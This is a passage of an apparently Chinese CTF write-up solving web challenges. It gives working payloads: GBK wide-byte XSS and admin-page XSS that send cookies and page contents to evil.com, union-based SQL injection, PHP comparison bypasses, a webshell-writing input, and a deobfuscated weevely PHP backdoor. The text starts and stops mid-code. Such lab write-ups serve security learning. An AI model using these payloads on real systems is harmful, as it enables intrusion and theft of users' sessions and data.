class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Wired filter<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;GBK&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Wired filter<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> a=<span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">autofocus</span>=<span class="string">&quot;autofocus&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到输出的网页上采用了 GBK 编码，可以用宽字节注入。测试 payload 为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%fa%<span class="number">22</span>;<span class="title function_">alert</span>(<span class="number">1</span>);<span class="comment">//</span></span><br></pre></td></tr></table></figure><p>在双字节编码中，前面的 %fa 加上反斜杠可以构成汉字“鶿”的编码，这样后面的双引号 %22 就可以成功逃逸，其他的引号可以使用 <code>String.fromCharCode</code> 绕过。</p><p>窃取 cookie 的 payload 如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%fa%22;img=document.createElement(String.fromCharCode(105,109,103));img.src=String.fromCharCode(104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,120,115,115,47,63,99,111,111,107,105,101,45)%2bescape%28document.cookie%29;document.getElementsByTagName(String.fromCharCode(98,111,100,121))[0].appendChild(img);//</span><br></pre></td></tr></table></figure><p>最后获得 flag 为：<code>flag&#123;GbK_is_3V1L&#125;</code></p><h1 id="Basic-SQL-75"><a href="#Basic-SQL-75" class="headerlink" title="Basic SQL(75)"></a>Basic SQL(75)</h1><p>最基础的 SQL 注入，可以用 SQLmap 直接扫或者手工注入。首选用 payload<code>&#39; or &#39;1&#39;=&#39;1</code>发现可以获取所有新闻，推测查询语句为：<code>select * from news where search like &#39;&#123;$_POST[&quot;search&quot;]&#125;&#39;;</code></p><p>获取查询出的列数：<code>a&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;3</code></p><p>获取所有数据库：<code>a&#39; union select &#39;1&#39;,(select group_concat(SCHEMA_NAME) from information_schema.schemata),&#39;3</code></p><p>获取当前数据库名：<code>a&#39; union select &#39;1&#39;,database(),&#39;3</code></p><p>获取当前数据库的所有表名：<code>a&#39; union select &#39;1&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;3</code></p><p>获取字段名：<code>a&#39; union select &#39;1&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;f1agfl4gher3&#39;),&#39;3</code></p><p>获取 flag：<code>a&#39; union select &#39;1&#39;,(select h3r31sfl4g from f1agfl4gher3),&#39;3</code></p><p>最后得到 flag 为：<code>flag&#123;sql_information_schema_hack&#125;</code></p><h1 id="Basic-PHP-75"><a href="#Basic-PHP-75" class="headerlink" title="Basic PHP(75)"></a>Basic PHP(75)</h1><p>直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// ========== Stage 1 ========== </span></span><br><span class="line">    <span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]; </span><br><span class="line">    <span class="variable">$test</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$test</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">&#x27;0&#x27;</span>) &#123; </span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;You passed stage 1.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Game over at stage 1.&quot;</span>; </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ========== Stage 2 ========== </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Your password can not be your name.&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;You passed stage 2.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>看源码一共有两关，第一关需要</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这里用的是弱等于，所以只需要找到一个 md5 是 0e 开的字符串就行，例如<code>QNKCDZO</code>，在弱等于时 0e 开头的字符串将会识别为科学计数法。第二关需要</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]</span><br></pre></td></tr></table></figure><p>这里需要 name 和 password 不相等，但是他们的 sha1 要相等，并且还是强等于，由于 sha1 函数无法处理数组，所以当 name 和 password 同是数组时 sha1 函数将返回 false，并且 name 和 password 是一个不相等的数组。<br>payload 为：<code>/?test=QNKCDZO&amp;name[]=a&amp;password[]=b</code></p><p>最后获得 flag 为：<code>flag&#123;=_=PHP_1S_TH3_BES7_L4NGUAGE&#125;</code></p><h1 id="Basic-PHP-2-75"><a href="#Basic-PHP-2-75" class="headerlink" title="Basic PHP 2(75)"></a>Basic PHP 2(75)</h1><p>直接给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&#x27;php&#x27;</span>)) || <span class="title function_ invoke__">is_int</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的是要写入一个 webshell，文件名是 config.php，所以不需要担心文件后缀的问题，但是源码里不允许在文件内容中出现 <code>php</code> 以及 <code>&lt;</code>，类似 Basic PHP 1，当传入的 content 是一个数组时，<code>stripos</code> 函数将会返回 false，这样就可以绕过 <code>is_int</code> 函数。</p><p>payload 为：<code>/index.php?content[]=&lt;%3Fphp+eval%28%24_GET%5Ba%5D%29%3B</code></p><p>最后获取 flag 为：<code>flag&#123;pwnhub_first_shalon_ctf_web_php&#125;</code></p><h1 id="BabyXSS-100"><a href="#BabyXSS-100" class="headerlink" title="BabyXSS(100)"></a>BabyXSS(100)</h1><p>是一个很简单的打 cookie 的 XSS，提到了 flag 在 admin.php 里，但是需要 admin 的 cookie。</p><p>测试 paylaod：<code>&lt;img src=&#39;http://evil.com/xss/&#39;/&gt;</code>，发现有反应，那就可以直接在参数里带上 cookie</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;http://evil.com/xss/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)/&gt;</span><br></pre></td></tr></table></figure><p>但是发现发来的 cookie 是空的，所以拿不到管理员的 cookie，但是可以用 CSRF，通过 XSS 用管理员的 cookie 去访问 admin.php，最后再把访问到的结果发到 XSS 服务器上。payload 如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        img.<span class="property">src</span> = <span class="string">&#x27;http://evil.com/xss/?content=&#x27;</span> + <span class="built_in">escape</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(img);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/admin.php&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后获得的 flag 为：<code>flag&#123;this_is_a_xss_flag&#125;</code></p><h1 id="BasicFileInclude-150"><a href="#BasicFileInclude-150" class="headerlink" title="BasicFileInclude(150)"></a>BasicFileInclude(150)</h1><p>最简单的文件包含题目，url 里直接包含了 flag.php，那么就可以使用 php 伪协议读取 flag.php，由于再后端结尾自动拼接了”.php”，所以就不用加上 php 文件后缀了。</p><p>payload 如下：<code>?page=php://filter/read=convert.base64-encode/resource=flag</code></p><p>最后获得 flag 为：<code>flag&#123;really_basic_skill_web_dog_should_know&#125;</code></p><h1 id="FxxkingBackdoor-175"><a href="#FxxkingBackdoor-175" class="headerlink" title="FxxkingBackdoor(175)"></a>FxxkingBackdoor(175)</h1><p>下载打开 backdoor.php，这是一个木马软件 weevely 生成的 php 木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$c</span>=<span class="string">&#x27;ue)ery)e&quot;],$q);$q=array_valu)ees($q);preg_)ema)etch_all()e&quot;/([\w]&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$e</span>=<span class="string">&#x27;$i&lt;$l);$j++)e,$i++)&#123;$o.=$t&#123;)e$i&#125;^$k&#123;$j&#125;;&#125;&#125;retur)en )e$o;&#125;$r=$_SER&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$G</span>=<span class="string">&#x27;o=ob_get_conte)ents();ob_e)end_cle)ean();$d=base)e64_encod)ee(x(g&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$g</span>=<span class="string">&#x27;$)ekh)e=&quot;d0)e3a&quot;;$kf=&quot;1f3c&quot;;function x($t)e,$k)&#123;$c=strlen($k);$l=&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$F</span>=<span class="string">&#x27;=strpos($s[)e$i],$f);)eif($e)&#123;$k=$kh.$kf;ob)e_sta)ert();@eval)e(@&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$I</span>=<span class="string">&#x27;gz)eunco)empress(@)ex(@b)ease6)e4_decode(p)ere)eg_repl)eace()ear)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$h</span>=<span class="string">&#x27;_sta)ert();$s=&amp;$_SES)eSION;$ss=&quot;substr&quot;;$sl=&quot;s)etrtolower&quot;;$i=)e$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$K</span>=<span class="string">&#x27;U)eAGE&quot;];if($rr&amp;&amp;)e$ra)&#123;$u=pa)erse_url($rr))e;parse)e_str)e($u[&quot;q&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$M</span>=<span class="string">&#x27;m[1][)e0].$m[1])e[1];$h=$sl($ss(m)ed5($i.$k)eh),0,3)e));$f=$sl($s&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$C</span>=<span class="string">&#x27;s()emd5($i)e.$kf),0,3));$p=&quot;&quot;;)efor($z=1;$z&lt;count($m[1]);$z++)$p.&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$n</span>=<span class="string">&#x27;)eVE)eR;$rr=@$r[&quot;HTTP_REFERE)eR&quot;)e];$ra=)e@$r[&quot;HTTP_AC)eCEPT_LANG&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$p</span>=<span class="string">&#x27;=$q)e[$m[2][$z]];if(strpos()e$p)e,$)eh)===0)&#123;$s[$)ei])e=&quot;)e&quot;;$p=$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$s</span>=<span class="string">&#x27;zcompress($o),$k));print(&quot;&lt;$k&gt;$d&lt;/$)ek&gt;&quot;);@sess)eion_de)estroy();&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$R</span>=<span class="string">&#x27;)ess($)ep,3))e;&#125;if(array_key_exists()e$i,$)es))e)&#123;$s)e[$i].=$p;$e&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$V</span>=<span class="string">&#x27;strlen($t);$o=&quot;&quot;;f)eor($)ei=0;)e$i)e&lt;$l;)e)&#123;)efor($j=0)e;($j&lt;$c&amp;&amp;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$y</span>=<span class="string">&#x27;)[\w-]+(?:;q=0.([\d]))?)e,?/&quot;,$ra,$m);i)ef()e$q&amp;&amp;)e$m)&#123;@sessi)eon&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$P</span>=<span class="string">&#x27;eray(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss()e$s[$i],0)e,$e))),$)ek)));$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$t</span>=<span class="string">&#x27;&#125;&#125;&#125;&#125;&#x27;</span>;<span class="variable">$Y</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$L</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;)e&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$g</span>.<span class="variable">$V</span>.<span class="variable">$e</span>.<span class="variable">$n</span>.<span class="variable">$K</span>.<span class="variable">$c</span>.<span class="variable">$y</span>.<span class="variable">$h</span>.<span class="variable">$M</span>.<span class="variable">$C</span>.<span class="variable">$p</span>.<span class="variable">$R</span>.<span class="variable">$F</span>.<span class="variable">$I</span>.<span class="variable">$P</span>.<span class="variable">$G</span>.<span class="variable">$s</span>.<span class="variable">$t</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="keyword">echo</span> <span class="variable">$L</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;<span class="keyword">echo</span> <span class="variable">$Y</span>;<span class="variable">$v</span>=<span class="variable">$Y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>);<span class="variable">$v</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>最前面都是经过混淆后的代码，最后真正开始执行的语句是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v</span>=<span class="variable">$Y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>);<span class="variable">$v</span>();</span><br></pre></td></tr></table></figure><p>所以在这条语句前打印一下看看它执行了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$Y</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;<span class="title function_ invoke__">highlight_string</span>(<span class="variable">$L</span>);<span class="variable">$v</span>=<span class="variable">$Y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>);<span class="variable">$v</span>();</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create_function</span><br><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;d03a&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;1f3c&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;<span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;<span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;&#125;&#125;<span class="keyword">return</span> <span class="variable">$o</span>;&#125;<span class="variable">$r</span>=<span class="variable">$_SERVER</span>;<span class="variable">$rr</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];<span class="variable">$ra</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="keyword">if</span>(<span class="variable">$rr</span>&amp;&amp;<span class="variable">$ra</span>)&#123;<span class="variable">$u</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$rr</span>);<span class="title function_ invoke__">parse_str</span>(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>],<span class="variable">$q</span>);<span class="variable">$q</span>=<span class="title function_ invoke__">array_values</span>(<span class="variable">$q</span>);<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$ra</span>,<span class="variable">$m</span>);<span class="keyword">if</span>(<span class="variable">$q</span>&amp;&amp;<span class="variable">$m</span>)&#123;@<span class="title function_ invoke__">session_start</span>();<span class="variable">$s</span>=&amp;<span class="variable">$_SESSION</span>;<span class="variable">$ss</span>=<span class="string">&quot;substr&quot;</span>;<span class="variable">$sl</span>=<span class="string">&quot;strtolower&quot;</span>;<span class="variable">$i</span>=<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];<span class="variable">$h</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>));<span class="variable">$f</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>));<span class="variable">$p</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$z</span>=<span class="number">1</span>;<span class="variable">$z</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++)<span class="variable">$p</span>.=<span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$p</span>,<span class="variable">$h</span>)===<span class="number">0</span>)&#123;<span class="variable">$s</span>[<span class="variable">$i</span>]=<span class="string">&quot;&quot;</span>;<span class="variable">$p</span>=<span class="variable">$ss</span>(<span class="variable">$p</span>,<span class="number">3</span>);&#125;<span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$i</span>,<span class="variable">$s</span>))&#123;<span class="variable">$s</span>[<span class="variable">$i</span>].=<span class="variable">$p</span>;<span class="variable">$e</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>);<span class="keyword">if</span>(<span class="variable">$e</span>)&#123;<span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>;<span class="title function_ invoke__">ob_start</span>();@<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),<span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="number">0</span>,<span class="variable">$e</span>))),<span class="variable">$k</span>)));<span class="variable">$o</span>=<span class="title function_ invoke__">ob_get_contents</span>();<span class="title function_ invoke__">ob_end_clean</span>();<span class="variable">$d</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">x</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));<span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);@<span class="title function_ invoke__">session_destroy</span>();&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>因此 L 里面存储的是 webshell 的代码，Y 是 create_funciton，所以最后创建了一个匿名函数 v 去执行 webshell，将 L 的代码格式化后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 